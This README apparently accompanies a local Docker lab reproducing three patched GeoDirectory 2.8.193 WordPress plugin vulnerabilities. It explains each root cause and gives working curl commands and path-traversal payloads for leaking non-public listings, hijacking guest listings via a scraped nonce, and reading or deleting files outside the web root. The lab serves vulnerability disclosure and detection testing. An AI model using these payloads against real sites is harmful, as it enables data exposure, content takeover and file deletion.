# GeoDirectory 2.8.193 — three CVEs fixed in 2.8.194

One shared WordPress + **GeoDirectory 2.8.193** lab that reproduces three
distinct, independently-confirmed vulnerabilities, all patched in **2.8.194**:

| CVE | Class (CWE) | Auth | Exploit |
| --- | --- | --- | --- |
| [CVE-2026-113490](https://wpscan.com/vulnerability/2901f8f3-0b35-4565-b248-6c0dfc5de894/) | Sensitive data disclosure (CWE-200) | **none** | `exploit_cve_2026_113490.py` |
| [CVE-2026-113491](https://wpscan.com/vulnerability/ba2114a5-01e3-40e7-a7f6-673674b6501d/) | Path traversal (CWE-22) | Subscriber+ | `exploit_cve_2026_113491.py` |
| [CVE-2026-113674](https://wpscan.com/vulnerability/23e66ca1-50eb-4ac1-9f5f-f830235c5af0/) | Broken access control (CWE-284) | **none** (guest posting on) | `exploit_cve_2026_113674.py` |

They share one plugin build and one install, so the lab spawns a single stack
instead of three identical WordPress instances. Each exploit is self-contained
and reads `.lab-ids` (written by `setup.sh`).

## Spawn

```bash
./setup.sh          # builds the stack, installs GeoDirectory 2.8.193, seeds fixtures
```

WordPress is at `http://127.0.0.1:8089` (admin/admin, subscriber `sub`/`subpass123`).
`setup.sh` enables guest posting, creates public/draft/guest/owned listings, a
subscriber-owned draft, and plants the path-traversal target files.

```bash
./exploit_cve_2026_113490.py    # unauth non-public listing disclosure
./exploit_cve_2026_113674.py    # unauth guest-listing takeover
./exploit_cve_2026_113491.py    # subscriber path traversal (read + delete)
```

All three print `VULNERABLE` (exit 0) against 2.8.193 and `NOT vulnerable`
(exit 1) against 2.8.194.

---

## CVE-2026-113490 — unauthenticated non-public listing disclosure

**Root cause** — `includes/api/class-geodir-rest-markers-controller.php`:

```php
public function get_marker_item( $request ) {
    $id = (int) $request['id'];
    $response['html'] = $id > 0 ? $this->marker_content( $id ) : '';   // no status/ownership check
    return $response;
}
public function get_marker_item_permissions_check( $request ) {
    return $this->show_in_rest();                                      // returns true -> public
}
```

`GET /wp-json/geodir/v2/markers/<id>` renders the map-popup HTML (title,
permalink, card fields) for **any** listing id, including draft / pending /
private / trashed listings, to anonymous users. The front end returns 404 for
those same ids. 2.8.194 adds `can_view_marker_item()` (status + ownership) to
both the handler and the permission callback.

```bash
# Non-public (draft) listing leaks its title via the markers route…
curl -s "http://127.0.0.1:8089/wp-json/geodir/v2/markers/11" | head -c 200
# …while the front end hides it:
curl -s -o /dev/null -w '%{http_code}\n' "http://127.0.0.1:8089/?post_type=gd_place&p=11"   # 404
```

> Note: `gd_place` is not exposed in core `wp/v2` REST at all, so the detector
> uses the **front-end** single view (published = 200, non-public = 404) as the
> "is it public?" oracle — not core REST (which 404s every status).

---

## CVE-2026-113674 — unauthenticated takeover of guest-submitted listings

**Root cause** — `includes/class-geodir-post-data.php::can_edit()`:

```php
if ( $author_id == $user_id ) {            // evaluated FIRST
    $owner = true;
} elseif ( current_user_can('edit_others_posts') ) {
    $owner = true;
} elseif ( ! $user_id ) { /* guest cookie token */ }
```

Guest-submitted listings have `post_author = 0`. A logged-out attacker also has
user id `0`, so `$author_id == $user_id` is `0 == 0` and ownership is granted to
anyone. The nopriv ajax actions `geodir_save_post` / `geodir_auto_save_post`
then allow editing, re-categorising, unpublishing or trashing any guest listing.
The `security` nonce is identical for every logged-out visitor and is read from
the public add-listing form. 2.8.194 requires a non-zero author match and gates
logged-out users behind a `hash_equals()` guest-ownership token.

```bash
B=http://127.0.0.1:8089
N=$(curl -s "$B/add-listing/?listing_type=gd_place" | grep -oE 'name="security" value="[a-f0-9]+"' | grep -oE '[a-f0-9]+$')
# Hijack a guest listing (author 0):
curl -s "$B/wp-admin/admin-ajax.php" -d "action=geodir_save_post&security=$N&ID=13&post_type=gd_place&post_title=HIJACKED&post_category[]=2"
# -> {"success":true,...}   ;  a registered user's listing returns "You do not have the privileges…"
```

Precondition: WordPress registration **on** + GeoDirectory "Allow posting
without logging in?" (`post_logged_out`) **on** — the documented guest-posting
mode. `setup.sh` enables both.

---

## CVE-2026-113491 — Subscriber path traversal (arbitrary read + delete)

**Root cause** — `includes/class-geodir-media.php::get_external_media()`:

```php
if ( strpos( $url, $upload_dir['baseurl'] . '/geodir_temp/' ) === 0 ) {
    $temp_url = str_replace( $upload_dir['baseurl'].'/geodir_temp/',
                             $upload_dir['basedir'].'/geodir_temp/', $url );  // no ".." check
    if ( file_exists( $temp_url ) ) { $temp_file = $temp_url; }
}
...
$results = wp_handle_sideload( $file, $overrides );   // copy -> public uploads  (DISCLOSURE)
@unlink( $temp_file );                                // delete the source      (DELETION)
```

A non-featured `post_images` entry (index ≥ 1 — index 0 goes through the safe
`media_sideload_image`) whose URL is `<baseurl>/geodir_temp/<../ …>/x.jpg` is
mapped directly to a filesystem path with no traversal check. The resolved file
is copied into the public uploads directory **and** `@unlink()`'d. The
`@unlink()` runs *before* the sideload error is checked, so **deletion works for
any file content**; disclosure (republish) works for real image files. The
filename must end in an allowed image extension (so `wp-config.php` itself is not
directly reachable). `post_images` entries are split on `::`, each `url|id|title|
caption`, and errored entries "fail silently", so order-0 can be an empty dummy.

```bash
# As a Subscriber (after logging in and reading the geodir-save-post nonce):
#   post_images = ::<baseurl>/geodir_temp/../../../../../../var/loot.jpg|
#   -> /var/loot.jpg (OUTSIDE the web root) is republished to a public uploads URL
#   post_images = ::<baseurl>/geodir_temp/../../DELETE_ME.jpg|
#   -> a file outside geodir_temp is deleted
```

2.8.194 adds `get_temp_file_path()` (rejects `..`, `realpath`-confines to
`geodir_temp`) and `attachment_belongs_to_post()`.

---

## Detection notes

- These are **source-derived, confirmed** exploits: each was validated to fire
  against 2.8.193 and to be rejected by 2.8.194 (run the exploits before and
  after `wp plugin install geodirectory --version=2.8.194 --force`).
- 113490 is additionally Nuclei-matchable (a positive 200-with-title on a
  non-public id); 113674 and 113491 change server state, so they are shipped as
  scripted PoCs rather than scanner templates.

## Cleanup

```bash
docker compose down -v
```

> ⚠️ Intentionally vulnerable, and 113491 deletes files inside the container.
> Run locally/isolated only.
